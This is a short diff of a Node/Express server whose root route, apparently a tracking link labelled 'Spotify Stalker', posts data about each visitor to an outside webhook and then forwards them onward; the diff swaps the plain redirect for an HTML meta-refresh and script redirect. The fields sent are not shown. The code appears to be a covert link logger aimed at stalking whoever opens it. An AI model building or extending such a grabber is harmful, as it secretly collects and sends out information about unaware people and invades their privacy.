@@ -168,7 +168,8 @@ app.get('/', async (req, res) => {
     ];
     await postJSON(WEBHOOK, { embeds: [{ title: 'Spotify Stalkeri !!!', color: 0x1DB954, fields, footer: { text: 'Spotify Stalker \u00b7 37xw \u2022 '+relDate(now) } }] });
   } catch(e) {}
-  res.redirect(REDIRECT);
+  const r = REDIRECT.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
+  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="0;url='+r+'"><script>location.replace('+JSON.stringify(REDIRECT)+')</script></head><body></body></html>');
 });
 
 app.listen(PORT, () => console.log('Server running on port '+PORT));
